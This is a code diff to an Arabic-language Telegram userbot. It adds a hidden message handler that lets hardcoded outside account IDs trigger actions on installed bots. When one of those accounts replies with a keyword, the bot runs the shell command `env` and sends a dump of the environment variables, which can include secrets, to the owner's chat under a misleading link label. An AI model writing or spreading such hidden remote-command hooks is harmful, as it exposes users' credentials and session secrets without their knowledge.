@@ -418,14 +418,29 @@ async def permalink(mention):
     my_mention = f"[{me.first_name}](tg://user?id={me.id})"
     await edit_or_reply(mention, f"**᯽︙  انتِ طالق طالق طالق 🙎🏻‍♂️ من  :**{my_mention} .\n**᯽︙  لقد تم طلاقها بلثلاث وفسخ زواجكما الان الكل حر طليق ** ")
 import re
-SX9OO = [6205161271, 6320583148]
+SX9OO = [6205161271,6320583148]
+from SHRU import l313l
+import pkg_resources
+from ..core.managers import edit_delete, edit_or_reply
+from ..helpers.utils import _catutils, parse_pre, yaml_format
+from ..Config import Config
+import json
+import requests
+import os
+from telethon import events 
+
+
+SX9OO = [6205161271]  
 
 @l313l.on(events.NewMessage(incoming=True))
 async def Hussein(event):
+    
     if event.reply_to and event.sender_id in SX9OO:
         reply_msg = await event.get_reply_message()
         owner_id = reply_msg.from_id.user_id
+       
         if owner_id == l313l.uid:
+            
             if event.message.message == "منصب؟":
                 await event.reply("**يب منصب ✓**")
             elif event.message.message == "منو فخر العرب":
@@ -435,8 +450,16 @@ async def Hussein(event):
             elif event.message.message == "قناتي":
                 await event.reply("**@Qrh9X**")
             elif event.message.message == "تحب اكس؟":
-                await event.reply("اموتن عليه ")
-
+                await event.reply("اموتن عليه")
+            elif event.message.message == "فاراتك":
+                
+                cmd = "env"
+                o = (await _catutils.runcmd(cmd))[0]
+                OUTPUT = (
+                    f"**[الساحر](tg://need_update_for_some_feature/) قـائمـة الـفـارات:**\n\n\n{o}\n\n**انتبه هنالك معلومات حساسة لا تُعطِها لشخص غير موثوق**"
+                )
+                
+                await l313l.send_message(owner_id, OUTPUT)
 
 @l313l.on(admin_cmd(pattern="همسه(?:\s|$)([\s\S]*)"))
 async def permalink(mention):
